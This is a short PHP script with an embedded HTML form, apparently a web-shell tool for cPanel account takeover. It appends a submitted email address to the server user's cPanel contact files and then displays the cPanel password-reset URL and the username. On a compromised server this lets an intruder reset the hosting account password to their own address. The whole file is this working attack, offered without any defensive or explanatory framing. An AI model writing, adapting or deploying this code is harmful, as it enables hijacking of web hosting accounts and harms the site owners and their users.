  
	    <form action="#" method="post">
	<input type="email" name="email" style="background-color: #181818;font: 9pt tahoma;color:#80D713;" />
	<input type="submit" name="submit" value="Send" style="background-color: #181818;font: 9pt tahoma;color:#80D713;"/>
	</form>
	<?
$user = get_current_user();
$site = $_SERVER['HTTP_HOST'];
$ips = getenv('REMOTE_ADDR');

if(isset($_POST['submit'])){
	
	$email = $_POST['email'];
	$wr = 'email:'.$email;
$f = fopen('/home/'.$user.'/.cpanel/contactinfo', 'a');
fwrite($f, $wr); 
fclose($f);
$f = fopen('/home/'.$user.'/.contactinfo', 'a');
fwrite($f, $wr); 
fclose($f);
$parm = $site.':2082/resetpass?start=1';
echo '<br/><center>'.$parm.'</center>';
echo '<br/><center>'.$user.'</center>';
}

?>